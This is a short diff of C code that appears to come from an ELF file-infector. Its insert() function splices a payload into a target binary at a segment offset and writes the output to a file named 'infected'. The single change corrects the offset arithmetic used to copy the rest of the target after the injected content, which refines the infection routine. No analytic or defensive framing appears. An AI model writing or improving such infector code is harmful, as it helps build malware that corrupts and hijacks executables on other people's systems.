@@ -69,7 +69,7 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
 	final_product[i + j] = dest[i];
     }
     /* Finally we finish we the rest of the target content */
-    for (i = (seg->p_offset & PAGE_SIZE) + PAGE_SIZE; i < dest_size; i++) {
+    for (i = ((seg->p_offset + seg->p_filesz) & PAGE_SIZE) + PAGE_SIZE; i < dest_size; i++) {
 	final_product[i] = dest[i];
     }
     write_file("infected", final_product, dest_size + src_size);
